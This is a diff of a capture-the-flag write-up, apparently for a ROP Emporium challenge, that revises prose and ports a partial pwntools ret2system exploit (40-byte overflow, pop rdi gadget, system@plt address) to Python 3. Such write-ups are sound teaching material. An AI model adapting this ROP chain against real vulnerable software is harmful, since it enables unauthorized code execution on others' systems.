@@ -115,7 +115,7 @@ We can find all the strings in binary using rabin2. As we can see from the below
 
 > sytem@plt
 
-As we can see from below img the address of systemis(0x4005e0)
+Using objdump we can grab the address of system@plt. As we can see from below img the address of systemis(0x4005e0)
 
 ![source-01](/img/Screenshot_2020-05-16_07-41-34.png	){: .align-left}
 
@@ -130,21 +130,20 @@ I used ROPGadget to find the pop rdi ret, as we can see from the below img the a
 
 #### Exploitation 
 
-Now let’s craft the payload.
+As we have all the pieces to put together our ROPChain, Now let’s craft the payload.
 
 Junk + pop_rdi + bin_cat + system_plt
 
 
-
-Full exploit using pwntools:
+Final exploit using pwntools:
 
 ```
  
-#!/usr/bin/python
+#!/usr/bin/python3
 from pwn import *
  
 def main():
-    junk = "A" * 40                     # RIP Offset at 40
+    junk = b"A" * 40                     # RIP Offset at 40
     cat_flag = p64(0x00601060)          # Radare2 command: izz
     system_plt = p64(0x4005e0)          # objdump -d split | grep system
     pop_rdi = p64(0x0000000000400883)   # python ROPgadget.py --binary split | grep rdi
